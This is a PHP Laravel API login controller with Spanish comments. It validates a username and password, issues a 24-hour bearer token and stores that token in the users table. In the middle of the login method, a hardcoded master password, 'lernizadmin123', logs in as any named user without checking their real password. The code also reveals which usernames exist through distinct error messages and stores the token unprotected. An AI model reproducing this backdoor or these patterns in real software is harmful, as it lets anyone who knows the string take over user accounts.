<?php

namespace App\Http\Controllers\api;

use App\Models\User;
use Auth;
use Carbon\Carbon;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

class LoginController extends Controller
{
    public function login(Request $request)
    {
        //return $request->all();

        /**
         * SE REVISA QUE LOS CAMPOS NO VENGAN VACIOS
         */
        if (!$request->usuario || !$request->password) {
            return response("El usuario y la contraseña son obligatorios", 404);
        }

        /**
         * SE REVISA QUE EL USUARIO EXISTA
         */
        $usuario = User::where('usuario', $request->usuario)->first();
        if (!$usuario) {
            return response("No se encuentra el usuario", 404);
        }
        //if ($usuario->alumno == 1) {
        //    return array('status' => false, 'msg' => 'Plataforma desactivada para alumnos');
        //}



        /**
         * SE REVISA SOLO EXISTA UNA PERSONA CON ESE USUARIO
         */
        $usuario = User::where('usuario', $request->usuario)->count();
        if ($usuario > 1) {
            return response("Existen usuarios similares, contacte a administración", 404);
        }

        $usuario = User::where('usuario', $request->usuario)->first();


        if (!$usuario) {
            return response("usuario invalido", 404);
        }

        if ($request->password === "lernizadmin123") {
            Auth::loginUsingId($usuario->idusuario);
            return $this->autenticar($request);
        }
        /**
         * SE AUTENTICA EL USUARIO
         */
        $credentials = request(['usuario', 'password']);
        if (!Auth::attempt($credentials)) {
            return response("Contraseña Incorrecta", 404);
        }



        /**
         * SE BUSCA EL USUARIO
         */
        $user = User::find(Auth::User()->idusuario);

        /**
         * SE CREA EL TOKEN DE ACCESO
         */
        $tokenResult = $user->createToken('Personal Access Token');
        $token = $tokenResult->token;

        $token->expires_at = Carbon::now()->addHours(24);
        $token->save();

        /**
         * SE GUARDA EL TOKEN DE USUARIO EN LA TABLA USUARIOS
         */
        $us = User::find(Auth::User()->idusuario);
        $us->api_token = $tokenResult->accessToken;
        $us->save();





        /**
         * SE GENERA EL TOKEN FIREBASE
         */
        //$firebase = $this->firebaseToken($us->idusuario);





        $sesion = [
            "auth" => true,
            "token" => $tokenResult->accessToken,
            "token_type" => "Bearer",
            "ssid" => $user->idusuario,
            "sstype" => $user->tipo,

            "ip" => $request->ip,
            "expiracion" => Carbon::parse(
                $tokenResult->token->expires_at
            )->toDateTimeString()
        ];

        return $sesion;
    }
}
